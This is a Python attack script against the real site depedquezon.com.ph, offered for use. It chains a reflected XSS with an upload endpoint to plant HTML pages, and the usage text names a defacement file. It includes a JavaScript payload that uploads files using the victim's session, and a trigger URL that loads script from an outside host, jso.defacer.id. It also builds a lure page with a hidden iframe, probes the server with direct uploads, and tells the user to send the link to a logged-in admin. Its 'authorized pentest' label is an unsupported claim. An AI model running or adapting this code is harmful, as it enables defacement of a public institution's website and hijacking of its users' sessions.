#!/usr/bin/env python3
"""
depedquezon.com.ph XSS -> File Upload Payload Generator
Authorized pentest tool - uploads .html files via XSS javascript execution

Usage:
  python3 depedxss.py --html deface.html          # Upload a local HTML file
  python3 depedxss.py --generate --msg "Hello"    # Generate + upload a test page
  python3 depedxss.py --xss-only                  # Just print the trigger URL
"""

import argparse
import base64
import hashlib
import json
import os
import sys
import time
import urllib.parse
from pathlib import Path

try:
    import requests
except ImportError:
    print("[!] Run: pip install requests")
    sys.exit(1)

requests.packages.urllib3.disable_warnings()

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║  depedxss.py - XSS -> File Upload                           ║
║  Target : https://depedquezon.com.ph                        ║
║  XSS    : ?result= parameter (Reflected, unsanitized)       ║
║  Upload : /link/save.php via same-origin fetch()            ║
╚══════════════════════════════════════════════════════════════╝
"""

BASE = "https://depedquezon.com.ph"

# ---------------------------------------------------------------------------
# JS payload that performs the file upload when executed in the victim's browser
# ---------------------------------------------------------------------------
JS_UPLOADER = r"""(function(){
var f=document.createElement('form');
f.method='POST';
f.action='/link/save.php';
f.enctype='multipart/form-data';
var i=document.createElement('input');
i.type='file';
i.name='file';
i.id='xssFile';
f.appendChild(i);
document.body.appendChild(f);
var b=new Blob([atob('{B64_HTML}')],{type:'text/html'});
var d=new DataTransfer();
d.items.add(new File([b],'{FILENAME}',{type:'text/html'}));
var fi=document.getElementById('xssFile');
Object.defineProperty(fi,'files',{value:d.files});
var fd=new FormData(f);
fd.set('file',d.files[0],'{FILENAME}');
fetch('/link/save.php',{method:'POST',body:fd,mode:'same-origin',credentials:'include'}).then(function(r){
if(r.status==200){console.log('[OK] Uploaded: {FILENAME}');}
}).catch(function(e){console.log('[FAIL]',e);});
})();
"""


def build_xss_trigger():
    """
    Returns the URL that triggers the XSS via external JS.
    This is user-specified; we return the known working one.
    """
    return 'https://depedquezon.com.ph/?result=%3Cscript+src%3D%22https%3A%2F%2Fjso.defacer.id%2Fraw%2Fnc91wdsbZ7%22%3E%3C%2Fscript%3E'


def generate_js_payload(html_content, filename="index.html"):
    """Wrap HTML content into the JS uploader payload."""
    html_b64 = base64.b64encode(html_content.encode()).decode()
    js = JS_UPLOADER.replace("{B64_HTML}", html_b64).replace("{FILENAME}", filename)
    return js


def generate_self_contained_html(html_content, filename="index.html"):
    """
    Generate a self-contained HTML file.
    When a victim opens it, it loads the XSS URL in an iframe
    which triggers the external JS that performs the upload.
    """
    xss_url = build_xss_trigger()

    # Encode the HTML content as a JS payload for the external host
    js_payload = generate_js_payload(html_content, filename)

    self_html = f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Loading...</title></head>
<body style="margin:0;background:#000;color:#0f0;font-family:monospace;
     display:flex;align-items:center;justify-content:center;height:100vh;">
  <div style="text-align:center;">
    <p>Processing ...</p>
    <iframe id="x" style="display:none;"></iframe>
  </div>
  <script>
    // Step 1: Load the XSS URL to execute JS in depedquezon.com.ph context
    var iframe = document.getElementById('x');
    iframe.src = {json.dumps(xss_url)};

    // Step 2: The external JS (jso.defacer.id) should perform the upload.
    // If you control that JS host, paste the following into it:
    console.log("Upload JS payload for external host:");
    console.log({json.dumps(js_payload)});
  </script>
</body>
</html>"""
    return self_html


# ---------------------------------------------------------------------------
# Direct file upload (probes the server directly, for verification)
# ---------------------------------------------------------------------------
def direct_upload(html_content, filename="index.html"):
    """Try to upload directly to the server."""
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

    url = f"{BASE}/link/save.php"
    print(f"  [*] POST {url}  field='file'  filename='{filename}'")

    r = s.post(
        url,
        files={"file": (filename, html_content.encode(), "text/html")},
        timeout=30,
        verify=False,
    )
    print(f"      Status: {r.status_code}  Length: {len(r.text)}")

    # Also try other field names
    for field in ["uploaded_file", "userfile", "upload"]:
        r2 = s.post(
            url,
            files={field: (filename, html_content.encode(), "text/html")},
            timeout=30,
            verify=False,
        )
        print(f"      field='{field}' -> {r2.status_code}")

    # Try PUT to various paths
    for path in [f"/data_files/{filename}", f"/link/{filename}", f"/img/{filename}"]:
        try:
            r3 = s.put(
                f"{BASE}{path}",
                data=html_content.encode(),
                headers={"Content-Type": "text/html"},
                timeout=15,
                verify=False,
            )
            print(f"  [*] PUT {path} -> {r3.status_code}")
        except Exception as e:
            print(f"  [*] PUT {path} -> ERROR: {e}")

    # Check if file appears anywhere
    print(f"\n  [*] Checking upload paths ...")
    for path in [
        f"/data_files/{filename}",
        f"/data_files/news/{filename}",
        f"/link/{filename}",
        f"/img/{filename}",
        f"/{filename}",
    ]:
        try:
            r4 = s.get(f"{BASE}{path}", timeout=10, verify=False)
            if r4.status_code == 200 and len(r4.text) > 50:
                print(f"  [✓] FOUND: {BASE}{path}  ({len(r4.text)} bytes)")
        except:
            pass


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="depedquezon.com.ph XSS -> File Upload Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--html", "-f", help="Local .html file to upload")
    parser.add_argument("--generate", "-g", action="store_true", help="Generate a test HTML page and upload it")
    parser.add_argument("--msg", "-m", default="Security Assessment by Authorized Pentester", help="Message for generated page")
    parser.add_argument("--filename", "-n", default="index.html", help="Filename to use on server (default: index.html)")
    parser.add_argument("--output", "-o", help="Save generated self-contained HTML to file")
    parser.add_argument("--xss-only", "-x", action="store_true", help="Only print the XSS trigger URL")

    args = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        print("\nQuick start:")
        print("  # Upload a local HTML file:")
        print("    python3 depedxss.py --html deface.html")
        print("\n  # Generate and upload a test page:")
        print("    python3 depedxss.py --generate --msg 'Your message here'")
        print("\n  # Get the XSS trigger URL:")
        print("    python3 depedxss.py --xss-only")
        sys.exit(1)

    print(BANNER)

    # --- Load / generate HTML content ---
    html_content = None
    if args.html:
        path = Path(args.html)
        if not path.exists():
            print(f"[!] File not found: {args.html}")
            sys.exit(1)
        html_content = path.read_text(encoding="utf-8", errors="replace")
        filename = path.name
        print(f"[*] Loaded: {args.html} ({len(html_content)} bytes)")
    elif args.generate:
        filename = args.filename
        html_content = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Security Assessment</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ background:#0a0c12; color:#00ff88; font-family:monospace;
       display:flex; align-items:center; justify-content:center;
       min-height:100vh; flex-direction:column; }}
h1 {{ font-size:2.5em; text-shadow:0 0 15px #00ff88; margin-bottom:20px; }}
p {{ font-size:1.1em; max-width:700px; text-align:center; line-height:1.6; }}
hr {{ width:50%; margin:20px 0; border-color:#00ff88; }}
.footer {{ color:#666; font-size:0.85em; }}
</style></head>
<body>
  <h1>PENTEST NOTICE</h1>
  <p>{args.msg}</p>
  <hr>
  <p class="footer">This page was placed during an authorized security assessment of depedquezon.com.ph</p>
</body></html>"""
        print(f"[*] Generated page ({len(html_content)} bytes)")
    else:
        print("[!] Use --html <file> or --generate to supply content")
        if args.xss_only:
            pass
        else:
            sys.exit(1)

    # --- Print XSS URL ---
    print(f"\n{'='*60}")
    print("  XSS TRIGGER URL")
    print(f"{'='*60}")
    print(f"\n  {build_xss_trigger()}\n")

    # --- Generate self-contained deliverable HTML ---
    if html_content and args.output:
        self_html = generate_self_contained_html(html_content, filename)
        Path(args.output).write_text(self_html)
        print(f"[✓] Saved self-contained HTML to: {args.output}")
        print(f"    Open this file in a browser to trigger the upload via XSS.\n")

    # --- Direct upload (probes server for verification) ---
    if html_content and (args.html or args.generate):
        print(f"{'='*60}")
        print("  DIRECT UPLOAD ATTEMPT (probes server)")
        print(f"{'='*60}\n")
        direct_upload(html_content, filename)

    # --- Summary ---
    print(f"\n{'='*60}")
    print("  NEXT STEPS")
    print(f"{'='*60}")
    print(f"""
  1. Make sure your JS host (https://jso.defacer.id/raw/nc91wdsbZ7)
     contains the upload JS payload.

  2. The JS payload that needs to be on that host is:

{generate_js_payload(html_content or '<html></html>', filename)}

  3. Send the XSS URL to a logged-in admin/user:

     {build_xss_trigger()}

  4. When they visit it, the external JS runs in depedquezon.com.ph's
     origin and performs a same-origin POST to /link/save.php with your
     HTML file attached.

  5. Check if the file landed at:
     https://depedquezon.com.ph/data_files/{filename}
     https://depedquezon.com.ph/link/{filename}
     https://depedquezon.com.ph/img/{filename}
""")

    if args.output:
        # Also save the JS payload separately
        if html_content:
            js_payload_path = Path(args.output).with_suffix(".js")
            js_payload_path.write_text(generate_js_payload(html_content, filename))
            print(f"  [i] JS payload for external host saved to: {js_payload_path}")


if __name__ == "__main__":
    main()
